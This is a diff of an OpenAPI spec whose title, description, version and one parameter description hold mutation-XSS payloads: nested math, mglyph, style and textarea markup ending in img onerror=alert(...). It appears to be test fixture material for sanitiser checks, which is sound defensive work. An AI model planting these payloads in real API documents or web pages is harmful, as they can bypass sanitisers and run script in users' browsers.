@@ -3,7 +3,6 @@ info:
   title: a <math><mtext><table><mglyph><style><math><table id=”</table>”><img src onerror=alert(1)”>
   description: |
     <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('textarea') src=1>"></form>
-
   version:  <form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>
 basePath: /JSSResource/
 produces:
@@ -28,7 +27,7 @@ paths:
     delete:
       parameters:
         - description: |
-            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('textarea') src=1>"></form>
+            <svg></p><style><a id="</style><img src=1 onerror=alert(1)>">
 
           format: int64
           in: path
